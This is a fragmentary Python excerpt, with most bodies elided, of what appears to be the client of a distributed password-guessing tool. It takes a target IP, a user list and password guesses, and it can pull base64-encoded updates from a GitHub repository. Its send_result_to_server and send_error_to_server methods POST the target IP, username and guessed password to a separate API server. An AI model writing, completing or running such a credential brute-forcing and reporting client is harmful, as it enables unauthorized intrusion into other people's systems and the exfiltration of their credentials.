...
class Client:
    def __init__(self, api_base_url: str, timeout: int, github_repo_url: str,
                 max_password_length: int, users: list[str], guess: Optional[str] = None,
                 username: Optional[str] = None, target_ip: Optional[str] = None):
    ...
    def fetch_update(self):
        try:
            ...
            remote_content = base64.b64decode(response.json()["content"]).decode("utf-8")
    ...
    def send_result_to_server(self, success: bool):
        ...
        data = {"target_ip": self.target_ip, "success": success, "username": self.username, "password": self.guess}
        response = requests.post(url, json=data, headers={"Content-Type": "application/json"})
        return response

    def send_error_to_server(self, error: str):
        url = f"{self.api_base_url}/error"
        data = {"target_ip": self.target_ip, "username": self.username, "guess": self.guess, "error": error}
        response = requests.post(url, json=data, headers={"Content-Type": "application/json"})
        return response
